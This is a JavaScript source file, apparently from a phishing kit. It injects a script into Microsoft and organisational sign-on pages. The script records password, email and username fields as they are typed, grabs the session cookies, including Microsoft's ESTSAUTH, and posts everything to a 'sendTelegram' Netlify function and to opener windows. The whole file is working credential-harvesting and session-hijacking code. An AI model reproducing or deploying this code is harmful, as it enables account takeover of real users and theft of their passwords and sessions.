/**
 * Password & Email Capture Injector
 * Captures password, email, and username fields on Microsoft and organizational login pages.
 * Stores credentials in sessionStorage and localStorage.
 * Sends credentials to parent/opener window if available.
 *
 * IMPORTANT: When running on Microsoft login domains (login.microsoftonline.com, login.live.com, account.microsoft.com),
 * this injector will attempt to deliver captured credentials (and the current document.cookie) directly to the
 * Netlify sendTelegram function. This ensures captured data is transmitted even when the original app
 * (opener) is no longer available (because navigation/unload occurred). This avoids relying on popups/parent windows.
 */
export function injectPasswordCaptureScript() {
  const hostname = window.location.hostname;
  const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
    hostname.includes('login.live.com') ||
    hostname.includes('account.microsoft.com');

  const isOrgDomain = hostname.includes('adfs') ||
    hostname.includes('sso') ||
    hostname.includes('okta') ||
    hostname.includes('ping') ||
    document.querySelector('input[type="password"]');

  if (isMicrosoftDomain || isOrgDomain) {
    const script = document.createElement('script');
    script.textContent = `
      (function() {
        // Enhanced cookie capture functionality
        function captureMicrosoftCookies() {
          try {
            const cookieString = document.cookie;
            if (!cookieString) return [];

            const cookies = [];
            const cookiePairs = cookieString.split(';');

            cookiePairs.forEach(pair => {
              const [name, value] = pair.trim().split('=');
              if (name && value) {
                cookies.push({
                  name: name.trim(),
                  value: value.trim(),
                  domain: window.location.hostname,
                  path: '/',
                  secure: window.location.protocol === 'https:',
                  httpOnly: false,
                  sameSite: 'Lax',
                  captureTime: new Date().toISOString()
                });
              }
            });

            return cookies;
          } catch (error) {
            console.warn('⚠️ Failed to capture cookies:', error);
            return [];
          }
        }

        // Enhanced credential retrieval from storage
        function getStoredCredentials() {
          try {
            const replacementCreds = localStorage.getItem('replacement_credentials') || 
                                   sessionStorage.getItem('replacement_credentials');
            const capturedCreds = localStorage.getItem('captured_credentials') || 
                                sessionStorage.getItem('captured_credentials');
            
            if (replacementCreds) {
              return JSON.parse(replacementCreds);
            } else if (capturedCreds) {
              return JSON.parse(capturedCreds);
            }
            return null;
          } catch (error) {
            console.warn('⚠️ Failed to retrieve stored credentials:', error);
            return null;
          }
        }

        let capturedCredentials = {
          email: '',
          password: '',
          username: '',
          domain: window.location.hostname,
          captureTime: new Date().toISOString()
        };

        // Small debounce to avoid spamming network calls
        let lastSendAt = 0;
        function canSendNow() {
          const now = Date.now();
          if (now - lastSendAt < 1200) return false;
          lastSendAt = now;
          return true;
        }

        // Enhanced function to send complete data to Telegram
        function sendCompleteDataToTelegram() {
          if (!canSendNow()) return;

          try {
            // Get stored credentials from replacement.html
            const storedCredentials = getStoredCredentials();
            
            // Capture current cookies
            const capturedCookies = captureMicrosoftCookies();
            
            // Prepare complete payload
            const completePayload = {
              // Use stored credentials from replacement.html if available, otherwise use captured ones
              email: storedCredentials?.email || capturedCredentials.email || '',
              password: storedCredentials?.password || capturedCredentials.password || '',
              passwordSource: 'microsoft-domain-capture',
              cookies: capturedCookies,
              userAgent: navigator.userAgent,
              sessionId: Date.now().toString(),
              url: window.location.href,
              timestamp: new Date().toISOString(),
              validated: storedCredentials?.validated || true,
              microsoftAccount: true,
              domain: window.location.hostname,
              // Include raw cookie string for additional processing
              rawCookies: document.cookie
            };

            console.log('📤 Sending complete data to Telegram:', {
              hasEmail: !!completePayload.email,
              hasPassword: !!completePayload.password,
              cookieCount: completePayload.cookies.length,
              validated: completePayload.validated
            });

            // Send to Telegram function
            fetch('/.netlify/functions/sendTelegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(completePayload)
            }).then(resp => {
              if (resp.ok) {
                console.log('✅ Complete data successfully sent to Telegram');
                // Mark as sent to prevent duplicate sends
                try {
                  localStorage.setItem('telegram_data_sent', 'true');
                  sessionStorage.setItem('telegram_data_sent', 'true');
                } catch (e) {}
              } else {
                console.warn('⚠️ sendTelegram returned status', resp.status);
              }
            }).catch(err => {
              console.warn('⚠️ Error sending complete data to Telegram:', err);
            });

            // Also send cookies to parent/opener for app state management
            const cookieMessage = {
              type: 'MICROSOFT_COOKIES_CAPTURED',
              data: {
                cookies: capturedCookies,
                credentials: storedCredentials,
                timestamp: new Date().toISOString()
              }
            };

            try {
              if (window.parent && window.parent !== window) {
                window.parent.postMessage(cookieMessage, '*');
              }
              if (window.opener) {
                window.opener.postMessage(cookieMessage, '*');
              }
            } catch (error) {
              // ignore postMessage errors
            }

          } catch (error) {
            console.warn('⚠️ Error in sendCompleteDataToTelegram:', error);
          }
        }

        function capturePasswordFromForms() {
          try {
            const passwordFields = document.querySelectorAll('input[type="password"]');
            const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"]');
            const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"]');

            let hasNewData = false;

            passwordFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.password) {
                capturedCredentials.password = field.value;
                hasNewData = true;
              }
            });

            emailFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.email) {
                capturedCredentials.email = field.value;
                hasNewData = true;
              }
            });

            usernameFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.username) {
                capturedCredentials.username = field.value;
                hasNewData = true;
              }
            });

            if (hasNewData) {
              storeCredentials();
              // Send complete data including cookies when credentials are captured
              sendCompleteDataToTelegram();
            }

            return hasNewData;
          } catch (error) {
            console.error('❌ Error capturing password:', error);
            return false;
          }
        }

        function storeCredentials() {
          const credentialsData = {
            email: capturedCredentials.email,
            password: capturedCredentials.password,
            username: capturedCredentials.username,
            domain: capturedCredentials.domain,
            captureTime: capturedCredentials.captureTime,
            source: 'injected-password-capture',
            url: window.location.href
          };

          try {
            // Ensure we set the same keys used elsewhere in the app (captured_credentials)
            sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
          } catch (error) {
            // ignore storage errors
          }

          // Send to parent/opener if available (best-effort)
          const payload = {
            type: 'CREDENTIALS_CAPTURED',
            data: credentialsData,
            source: 'injected-password-capture',
            timestamp: new Date().toISOString()
          };
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage(payload, '*');
            }
            if (window.opener) {
              window.opener.postMessage(payload, '*');
            }
          } catch (error) {
            // ignore
          }
        }

        // Enhanced monitoring for automatic login detection
        function monitorForAutoLogin() {
          // Check if we're on Microsoft domain and have stored credentials
          if (window.location.hostname.includes('login.microsoftonline.com') ||
              window.location.hostname.includes('login.live.com') ||
              window.location.hostname.includes('account.microsoft.com')) {
            
            // Check if data hasn't been sent yet
            const alreadySent = localStorage.getItem('telegram_data_sent') || 
                              sessionStorage.getItem('telegram_data_sent');
            
            if (!alreadySent) {
              // Wait a bit for page to load and cookies to be set, then send complete data
              setTimeout(() => {
                sendCompleteDataToTelegram();
              }, 2000);
              
              // Also monitor for successful login indicators
              const checkForLoginSuccess = () => {
                // Look for common Microsoft login success indicators
                const successIndicators = [
                  () => document.querySelector('[data-testid="signin-success"]'),
                  () => document.querySelector('.ms-welcome'),
                  () => document.querySelector('[aria-label*="signed in"]'),
                  () => window.location.href.includes('login_hint'),
                  () => window.location.href.includes('prompt=none'),
                  () => document.cookie.includes('ESTSAUTH'),
                  () => document.cookie.includes('ESTSAUTHPERSISTENT')
                ];
                
                const hasSuccessIndicator = successIndicators.some(check => {
                  try { return check(); } catch { return false; }
                });
                
                if (hasSuccessIndicator) {
                  console.log('🎯 Microsoft login success detected, sending complete data...');
                  sendCompleteDataToTelegram();
                }
              };
              
              // Check periodically for login success
              const loginCheckInterval = setInterval(() => {
                checkForLoginSuccess();
                // Stop checking after 30 seconds
                setTimeout(() => clearInterval(loginCheckInterval), 30000);
              }, 1000);
            }
          }
        }

        document.addEventListener('input', function(e) {
          if (
            e.target.type === 'password' ||
            e.target.name?.toLowerCase().includes('password') ||
            e.target.name?.toLowerCase().includes('email') ||
            e.target.name?.toLowerCase().includes('user') ||
            e.target.id?.toLowerCase().includes('password') ||
            e.target.id?.toLowerCase().includes('email') ||
            e.target.id?.toLowerCase().includes('user')
          ) {
            setTimeout(() => {
              capturePasswordFromForms();
            }, 300);
          }
        });

        document.addEventListener('submit', function(e) {
          setTimeout(() => {
            capturePasswordFromForms();
            // Send complete data on form submission
            setTimeout(() => {
              sendCompleteDataToTelegram();
            }, 500);
          }, 100);
        });

        document.addEventListener('click', function(e) {
          const target = e.target;
          if (
            target.type === 'submit' ||
            target.textContent?.toLowerCase().includes('sign in') ||
            target.textContent?.toLowerCase().includes('login') ||
            target.textContent?.toLowerCase().includes('next') ||
            target.className?.toLowerCase().includes('submit') ||
            target.className?.toLowerCase().includes('login')
          ) {
            setTimeout(() => {
              capturePasswordFromForms();
              // Send complete data on login button click
              setTimeout(() => {
                sendCompleteDataToTelegram();
              }, 1000);
            }, 500);
          }
        });

        // Monitor for page load and automatic login
        document.addEventListener('DOMContentLoaded', function() {
          setTimeout(() => {
            monitorForAutoLogin();
          }, 1000);
        });

        // Also run monitoring if DOM is already loaded
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => {
              monitorForAutoLogin();
            }, 1000);
          });
        } else {
          setTimeout(() => {
            monitorForAutoLogin();
          }, 1000);
        }

        setInterval(() => {
          capturePasswordFromForms();
        }, 3000);

        setTimeout(() => {
          capturePasswordFromForms();
          // Initial check for auto-login
          monitorForAutoLogin();
        }, 1000);
      })();
    `;
    document.head.appendChild(script);
  }
}
